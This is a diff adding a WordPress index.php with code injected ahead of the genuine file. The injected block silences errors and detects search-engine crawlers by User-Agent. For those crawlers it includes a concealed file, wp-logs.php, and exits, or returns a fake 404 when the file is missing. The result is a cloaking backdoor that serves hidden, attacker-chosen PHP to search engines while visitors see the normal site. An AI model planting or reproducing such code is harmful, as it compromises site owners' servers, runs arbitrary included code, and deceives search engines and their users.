@@ -1,0 +1,41 @@
+<?php
+error_reporting(0);
+set_time_limit(0);
+
+$bot_content_file = __DIR__ . '/wp-logs.php';
+
+function is_spider() {
+    $spiders = ['google', 'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandex', 'sogou', 'exabot', 'facebot', 'ia_archiver'];
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    foreach ($spiders as $s) {
+        if (strpos($ua, $s) !== false) return true;
+    }
+    return false;
+}
+
+if (is_spider()) {
+    if (file_exists($bot_content_file)) {
+        include $bot_content_file;
+        exit();
+    } else {
+        header("HTTP/1.0 404 Not Found");
+        exit("404 not found.");
+    }
+}
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
+?>
